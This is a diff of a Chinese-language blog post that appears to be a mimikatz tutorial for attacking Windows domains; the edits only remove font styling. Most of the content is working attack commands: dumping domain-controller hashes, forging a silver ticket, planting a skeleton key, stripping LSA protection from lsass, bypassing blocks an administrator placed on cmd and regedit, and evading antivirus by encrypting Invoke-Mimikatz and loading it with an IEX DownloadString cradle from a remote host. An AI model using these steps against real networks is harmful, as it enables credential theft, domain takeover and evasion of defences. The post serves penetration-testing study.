 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Copy#在域控上导出 DC$ 的 HASH</span><br><span class="line">mimikatz log &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot;</span><br><span class="line"></span><br><span class="line">#利用 DC$ 的 Hash制作一张 cifs 服务的白银票据</span><br><span class="line">kerberos::golden /domain:ABC.COM /sid: S-1-5-21-3912242732-2617380311-62526969 /target:DC.ABC.COM /rc4:f3a76b2f3e5af8d2808734b8974acba9 /service:cifs /user:strage /ptt</span><br><span class="line"></span><br><span class="line">#cifs是指的文件共享服务，有了 cifs 服务权限，就可以访问域控制器的文件系统</span><br><span class="line">dir \\DC.ABC.COM\C$</span><br></pre></td></tr></table></figure>
 
-<h4 id="5-3-skeleton-key"><a href="#5-3-skeleton-key" class="headerlink" title="5.3 skeleton key"></a><font style="color:rgb(51, 51, 51);">5.3 skeleton key</font></h4><p><font style="color:rgb(0, 0, 0);">skeleton key(万能钥匙)就是给所有域内用户添加一个相同的密码，域内所有的用户 都可以使用这个密码进行认证，同时原始密码也可以使用，其原理是对 lsass.exe 进行注 入，所以重启后会失效。</font></p>
+<h4 id="5-3-skeleton-key"><a href="#5-3-skeleton-key" class="headerlink" title="5.3 skeleton key"></a>5.3 skeleton key</h4><p>skeleton key(万能钥匙)就是给所有域内用户添加一个相同的密码，域内所有的用户 都可以使用这个密码进行认证，同时原始密码也可以使用，其原理是对 lsass.exe 进行注 入，所以重启后会失效。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Copy#在域控上安装 skeleton key</span><br><span class="line">mimikatz.exe privilege::debug &quot;misc::skeleton&quot;</span><br><span class="line"></span><br><span class="line">#在域内其他机器尝试使用 skeleton key 去访问域控，添加的密码是 mimikatz</span><br><span class="line">net use \\WIN-9P499QKTLDO.adtest.com\c$ mimikatz /user:adtest\administrator</span><br></pre></td></tr></table></figure>
 
-<p><font style="color:rgb(0, 0, 0);">微软在 2014 年 3 月 12 日添加了 LSA 爆护策略，用来防止对进程 lsass.exe 的代码注入。如果直接尝试添加 skelenton key 会失败。</font></p>
+<p>微软在 2014 年 3 月 12 日添加了 LSA 爆护策略，用来防止对进程 lsass.exe 的代码注入。如果直接尝试添加 skelenton key 会失败。</p>
 <p><img src="/"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Copy#适用系统</span><br><span class="line">windows 8.1</span><br><span class="line">windows server 2012 及以上</span><br></pre></td></tr></table></figure>
 
-<p><font style="color:rgb(0, 0, 0);">当然 mimikatz 依旧可以绕过，该功能需要导入mimidrv.sys文件，导入命令如下:</font></p>
+<p>当然 mimikatz 依旧可以绕过，该功能需要导入mimidrv.sys文件，导入命令如下:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Copyprivilege::debug</span><br><span class="line">!+</span><br><span class="line">!processprotect /process:lsass.exe /remove </span><br><span class="line">misc::skeleton</span><br></pre></td></tr></table></figure>
 
-<h4 id="5-4-MS14-068"><a href="#5-4-MS14-068" class="headerlink" title="5.4 MS14-068"></a><font style="color:rgb(51, 51, 51);">5.4 MS14-068</font></h4><p><font style="color:rgb(0, 0, 0);">当我们拿到了一个普通域成员的账号后，想继续对该域进行渗透，拿到域控服务器权限。如果域控服务器存在 MS14_068 漏洞，并且未打补丁，那么我们就可以利用 MS14_068 快速获得域控服务器权限。</font></p>
-<p><font style="color:rgb(0, 0, 0);">MS14-068编号 CVE-2014-6324，补丁为 3011780 ，如果自检可在域控制器上使用命令检测。</font></p>
+<h4 id="5-4-MS14-068"><a href="#5-4-MS14-068" class="headerlink" title="5.4 MS14-068"></a>5.4 MS14-068</h4><p>当我们拿到了一个普通域成员的账号后，想继续对该域进行渗透，拿到域控服务器权限。如果域控服务器存在 MS14_068 漏洞，并且未打补丁，那么我们就可以利用 MS14_068 快速获得域控服务器权限。</p>
+<p>MS14-068编号 CVE-2014-6324，补丁为 3011780 ，如果自检可在域控制器上使用命令检测。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Copysysteminfo |find &quot;3011780&quot;</span><br><span class="line">#为空说明该服务器存在MS14-068漏洞</span><br></pre></td></tr></table></figure>
 
-<p><font style="color:rgb(0, 0, 0);">操作链接：MS14-068复现(CVE-2014-6324)：</font><a target="_blank" rel="noopener" href="https://www.cnblogs.com/-mo-/p/11890539.html"><font style="color:rgb(0, 0, 0);">https://www.cnblogs.com/-mo-/p/11890539.html</font></a></p>
-<h3 id="0x06-其他"><a href="#0x06-其他" class="headerlink" title="0x06 其他"></a><font style="color:rgb(0, 0, 0);">0x06 其他</font></h3><h4 id="6-1-使用mimikatz导出chrome中的密码"><a href="#6-1-使用mimikatz导出chrome中的密码" class="headerlink" title="6.1 使用mimikatz导出chrome中的密码"></a><font style="color:rgb(51, 51, 51);">6.1 使用mimikatz导出chrome中的密码</font></h4><p><font style="color:rgb(0, 0, 0);">详情请见：</font><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIzOTg0NjYzNg==&mid=2247483949&idx=1&sn=db4853c88e4bf0a550c095d9017a363c&chksm=e92297aede551eb815a604ba944c4666b260c5bfe044e1b3a60946b586fd5679e29db0adf18d&mpshare=1&scene=23&srcid=&sharer_sharetime=1582350092849&sharer_shareid=d32981e13d51bf06188894426d2a54e5#rd"><font style="color:rgb(0, 0, 0);">链接</font></a></p>
-<h4 id="6-2-隐藏功能"><a href="#6-2-隐藏功能" class="headerlink" title="6.2 隐藏功能"></a><font style="color:rgb(51, 51, 51);">6.2 隐藏功能</font></h4><p><font style="color:rgb(0, 0, 0);">管理员常常会禁用一些重要程序的运行，比如cmd、regedit、taskmgr，此时不方便渗透的进一步进行，这里除了去改回原来的配置，还可以借助mimikatz的一些功能：</font></p>
+<p>操作链接：MS14-068复现(CVE-2014-6324)：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/-mo-/p/11890539.html">https://www.cnblogs.com/-mo-/p/11890539.html</a></p>
+<h3 id="0x06-其他"><a href="#0x06-其他" class="headerlink" title="0x06 其他"></a>0x06 其他</h3><h4 id="6-1-使用mimikatz导出chrome中的密码"><a href="#6-1-使用mimikatz导出chrome中的密码" class="headerlink" title="6.1 使用mimikatz导出chrome中的密码"></a>6.1 使用mimikatz导出chrome中的密码</h4><p>详情请见：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIzOTg0NjYzNg==&mid=2247483949&idx=1&sn=db4853c88e4bf0a550c095d9017a363c&chksm=e92297aede551eb815a604ba944c4666b260c5bfe044e1b3a60946b586fd5679e29db0adf18d&mpshare=1&scene=23&srcid=&sharer_sharetime=1582350092849&sharer_shareid=d32981e13d51bf06188894426d2a54e5#rd">链接</a></p>
+<h4 id="6-2-隐藏功能"><a href="#6-2-隐藏功能" class="headerlink" title="6.2 隐藏功能"></a>6.2 隐藏功能</h4><p>管理员常常会禁用一些重要程序的运行，比如cmd、regedit、taskmgr，此时不方便渗透的进一步进行，这里除了去改回原来的配置，还可以借助mimikatz的一些功能：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Copyprivilege::debug</span><br><span class="line">misc::cmd</span><br><span class="line">misc::regedit</span><br><span class="line">misc::taskmgr</span><br></pre></td></tr></table></figure>
 
-<h4 id="6-3-免杀处理"><a href="#6-3-免杀处理" class="headerlink" title="6.3 免杀处理"></a><font style="color:rgb(51, 51, 51);">6.3 免杀处理</font></h4><p><font style="color:rgb(0, 0, 0);">Powersploit中提供的很多工具都是做过加密处理的，同时也提供了一些用来加密处理的脚本，Out-EncryptedScript就是其中之一。</font></p>
-<p><font style="color:rgb(0, 0, 0);">首先在本地对Invoke-Mimikatz.ps1进行加密处理：</font></p>
+<h4 id="6-3-免杀处理"><a href="#6-3-免杀处理" class="headerlink" title="6.3 免杀处理"></a>6.3 免杀处理</h4><p>Powersploit中提供的很多工具都是做过加密处理的，同时也提供了一些用来加密处理的脚本，Out-EncryptedScript就是其中之一。</p>
+<p>首先在本地对Invoke-Mimikatz.ps1进行加密处理：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Copypoweshell.exe Import-Module .\Out-EncryptedScript.ps1</span><br><span class="line">poweshell.exe Out-EncryptedScript -ScriptPath .\Invoke-Mimikatz.ps1 -Password 密码 -Salt 随机数</span><br><span class="line">#默认生成的文件是evil.ps1</span><br><span class="line"></span><br><span class="line">-Password   设置加密的密钥</span><br><span class="line">-Salt       随机数，防止被暴力破解</span><br></pre></td></tr></table></figure>
 
-<p><font style="color:rgb(0, 0, 0);">将加密生成的evil.sp1脚本放在目标机上，执行如下命令：</font></p>
+<p>将加密生成的evil.sp1脚本放在目标机上，执行如下命令：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Copy#远程加载解密脚本</span><br><span class="line">poweshell.exe </span><br><span class="line">IEX(New-Object Net.WebClient).DownloadString(&quot;http://1.1.1.32/PowerSploit/ScriptModification/Out-EncryptedScript.ps1&quot;)</span><br><span class="line"></span><br><span class="line">[String] $cmd = Get-Content .\evil.ps1</span><br><span class="line">Invoke-Expression $cmd</span><br><span class="line">$decrypted = de password salt</span><br><span class="line">Invoke-Expression $decrypted</span><br><span class="line">Invoke-Mimikatz</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763012461670-83245bd4-618a-44fc-a035-5a4574e845e9.png"></p>
